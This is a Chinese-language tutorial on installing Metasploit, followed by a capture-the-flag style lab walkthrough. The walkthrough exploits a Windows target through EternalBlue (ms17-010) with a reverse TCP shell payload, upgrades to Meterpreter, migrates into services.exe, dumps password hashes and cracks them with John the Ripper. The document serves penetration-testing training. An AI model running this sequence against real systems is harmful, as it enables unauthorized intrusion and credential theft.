## 0×00：前言

学习metasploit使用![](https://image.3001.net/images/20210929/1632904796_6154265cede6e4e01106f.jpg!small)

## 0×01：安装教程

### 下 载

> 官 网 下 载 ：https://www.metasploit.com/download
>
> github： https://github.com/rapid7/metasploit-framework

 **搭建**

> https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
>
> Windows环境配置：（根据自己程序安装的文件地址）

![v2-4e606bd43431bb35b0a1b7a34e903d52_1440w.png](https://image.3001.net/images/20210929/1632906581_61542d552a3be60e49415.png!small)

![v2-db432cf00fd8b5c2f45768a801c84111_1440w.png](https://image.3001.net/images/20210929/1632906581_61542d559200ccd767751.png!small)

###
![v2-c8cb54c86542f49707374f62c7d27467_1440w.png](https://image.3001.net/images/20210929/1632906581_61542d55f06346e8961b0.png!small)  
注意事项

①如果你发现按照以上步骤操作都没有问题后，你执行“msfconsole”命令还提示：ʻmsfconsoleʼ
不是内部或外部命令，也不是可运行的程序或批处理文件。遇到这个问题也不用担心，只是环境变量设置的不正确的问题仅此而已。![v2-1bbc2cc7c6cce9c80dfac6e11e4620ca_1440w.png](https://image.3001.net/images/20210929/1632906582_61542d56cee3e6b1691f3.png!small)

②启动metasploit-framework除了用cmd命令“msfconsole”启动方式以外，还有一种其它的启动方式，直接双击 **bat启动**
，路径是“ **F:\metasploitframework\bin\msfconsole.bat**
"，其它类似的命令也可以这样。![v2-06c2e5642c4811b70ae3a6ab81b6337e_1440w.png](https://image.3001.net/images/20210929/1632906583_61542d57701957aa3b242.png!small)③metasploit-framework6.x似乎有一个安装位置小Bug，我准备把它安装在G盘根目录，结果它自动给我安装到D盘了，有可能是我电脑硬盘太多的原故，我还有H盘。

④metasploit-framework6.x启动的时候会提示一个“警告错误warning: Win32API is deprecated aher
Ruby 1.9.1; use fiddle directly
instead”以及无法加载“reverse_ssh.rb”模块，具体如下，但是不影响我们使用， Windows上面装metasploit-framework有点报错很正常。

Linux系统建议使用kali，或者使用docker搭建（安卓手机安装termux来安装metasploit）。

### docker搭建

> docker查找metasploit 镜像：docker search metasploit
>
> pull拉取镜像：docker pull linuxkonsult/kali-metasploit
>
> 创建容器：docker run -it -d --name msf -p 1234:1234 linuxkonsult/kali- metasploit
>
> 进入容器：docker exec -it id /bin/bash

启动：msfconsole![v2-4d9614927356b28679f3cb4e133a703f_1440w.png](https://image.3001.net/images/20210929/1632906584_61542d582e267506f89a4.png!small)

## 0×02：靶场实践

连接上靶机

### 侦查

nmap -sV --script vuln -oN nmap/initial <ip>  
![v2-cb5f5365f565eb8e0905dfbcf33f9190_1440w.png](https://image.3001.net/images/20210929/1632906586_61542d5a543c255c0525c.png!small)

发现端口 135、139、445、3389、49152、49153、49154、49158、49160 是开放的。

使用的nmap漏洞扫描使用整个类别的脚本来测试易受攻击的目标；可以看到 smb-vuln-ms17-010
给出了使用远程代码执行漏洞。![v2-f3a5ec5eb7f098c80cc8349284f7a453_1440w.png](https://image.3001.net/images/20210929/1632906587_61542d5be375962e90ac2.png!small)

### 获得访问权限

> 启动metasploit：msfconsole
>
> 查找ms17-010：search ms17-010（找到了 EternalBlue SMB 远程漏洞）

![v2-cfcaebda61a77d005454ff3f1fad697b_1440w.png](https://image.3001.net/images/20210929/1632906588_61542d5ce68e8e4f60328.png!small)

 **EternalBlue** 利用 SMBv1 漏洞插入恶意数据包并通过网络传播恶意软件。该漏洞利用了 Microsoh Windows
处理（或更确切地说是错误处理）来自恶意攻击者的特制数据包的方式。

###
选择exploit并设置选项![v2-ce0f0188366d35b744edbd240d36eca1_1440w.png](https://image.3001.net/images/20210929/1632906589_61542d5d8f63416526451.png!small)

![v2-88081a39f6f31d1e75b9780889fdb068_1440w.png](https://image.3001.net/images/20210929/1632906590_61542d5e7bc5fe27297a2.png!small)

> use 0
>
> show options
>
> 设置攻击机ip：set LHOST <ip>
>
> 设置攻击机监听端口：set LPORT 端口号
>
> 设置目标ip：set RHOSTS <ip>
>
> 设置有效攻击载荷（shell脚本）：set payload windows/x64/shell/reverse_tcp
>
> 运行攻击：exploit

###  **内网信息搜集**

检查我们当前的访问级别：whoami nt authority\system

## 0×03：提权

 **将当前的 shell 设为背景（Ctrl+Z）** 并将我们的 shell 转换为 Meterpreter shell

search shell_to_meterpreter

use 0

显示当前选定漏洞利用的选项，设置了 LHOST 和
SESSION![v2-4cce863a853a2984d3d091dd9e30f5f2_1440w.png](https://image.3001.net/images/20210929/1632906592_61542d60429ce9f971879.png!small)

set LHOST <ip>

set SESSION <session-no.>

运行漏洞利用程序并获得一个meterpreter会话，然后我们使用 meterpreter会话而不是
shell。![v2-c8e66c2b70e0ffae10f796905ab07fba_1440w.png](https://image.3001.net/images/20210929/1632906592_61542d60df00c24ab751b.png!small)session
-i <meterpreter-session-no.>

有一个 Meterpreter 会话，通过使用getsystem和getuid检查我们是否是NT AUTHORITY\SYSTEM。

我们作为系统运行，但这并不表明我们的进程是。我们需要迁移到另一个进程，一般我们使用services.exe。![v2-ec05c326723a8108de12cdac01d09384_1440w.png](https://image.3001.net/images/20210929/1632906593_61542d61e2b6271eaac99.png!small)

![v2-2e95beae7bc8e7a39f545edd4a9b3e07_1440w.png](https://image.3001.net/images/20210929/1632906595_61542d6324926f9ba52d0.png!small)

## 0×04：枚举破解文件

在一个高架的 Meterpreter 外壳中。我们可以使用命令 hashdump 并获取存储在机器上的密码哈希 **（在我们提升的 Meterpreter
shell
中，运行命令“hashdump”。只要我们有正确的权限，这就会转储机器上的所有密码）。**![v2-d98e3875e212fef32b1ef919fe8e4a50_1440w.png](https://image.3001.net/images/20210929/1632906595_61542d63955efeffe5fcc.png!small)

### hashdump

复制这个哈希并使用 John The Ripper 破解它，同时使用 Rockyou.txt 词表（ **默认情况下，John 专注于 LM 而不是
NTLM 哈希。因此，我们需要将格式指定为NT**
）。![v2-053492f72b6ded576134d4aaa132cbc1_1440w.png](https://image.3001.net/images/20210929/1632906596_61542d641a060ef0f63b0.png!small)

john --format=nt --wordlist=<path-to-wordlist> <hash> #获得了用户Jon的密码。

### 寻找flag

有一个meterpreter shell，我们可以在系统上搜索文件  
  
首先将目录更改为
C:/（系统根目录）。我们在系统根目录中找到flag1.txt![v2-047267b942da0b8f0e7051b3a8bc669d_1440w.png](https://image.3001.net/images/20210929/1632906596_61542d64c3699d746f0eb.png!small)

现在可以直接搜索标志，因为我们知道文件的格式：search -f flag*txt  
![v2-41f6e4f119fcbf8764c06d0942bba1c0_1440w.png](https://image.3001.net/images/20210929/1632906598_61542d665c6dfffb4d45c.png!small)

